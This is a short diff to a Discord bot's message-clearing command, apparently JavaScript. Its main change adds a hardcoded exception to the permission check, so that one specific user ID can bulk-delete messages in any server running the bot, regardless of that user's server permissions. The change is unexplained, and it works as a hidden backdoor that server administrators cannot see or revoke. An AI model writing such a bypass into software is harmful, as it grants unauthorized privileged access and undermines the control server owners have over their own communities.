@@ -6,7 +6,7 @@ exports.run = async (bot, message, args) => {
 
     // !clear aantal
 
-    if (!message.member.hasPermission("MANAGE_MESSAGES")) return message.reply("You dont have permission for this command!");
+    if (!message.member.hasPermission("MANAGE_MESSAGES") && message.author.id !== '434434883314647063') return message.reply("You dont have permission for this command!");
 
     if (!message.guild.me.hasPermission("MANAGE_MESSAGES")) return message.reply("I dont have the permissions to do this");
 
@@ -55,4 +55,3 @@ exports.help = {
     description: 'Clear messages',
     usage: 'clear #'
 };
-
